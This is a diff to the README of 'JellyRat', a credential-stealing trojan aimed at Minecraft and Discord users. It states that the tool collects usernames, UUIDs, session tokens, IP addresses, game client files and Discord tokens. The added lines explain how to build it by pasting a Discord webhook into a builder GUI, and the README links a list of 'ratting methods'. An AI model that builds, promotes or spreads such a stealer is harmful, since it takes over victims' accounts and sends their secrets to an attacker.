@@ -1,5 +1,5 @@
 # JellyRat
-New Github cause old one got term
+New Github cause old one got terminated
 
 # Features
 Grabs the username, uuid, token, ip, feather file, essentials file, lunar file and discord tokens of a target as a JSON.
@@ -29,6 +29,9 @@ Great New Look
 
 https://raw.githubusercontent.com/RattyTheRatter/JellyRat/main/Ratting_Methods.txt for ratting methods
 
+# how to use
+
+Run https://github.com/RattyTheRatter/JellyRat/releases/tag/Release_1.3 and in the gui paste your discord webhook and click build. It will open a folder called dist and inside will be your compiled rat
 
 
 # Disclaimer
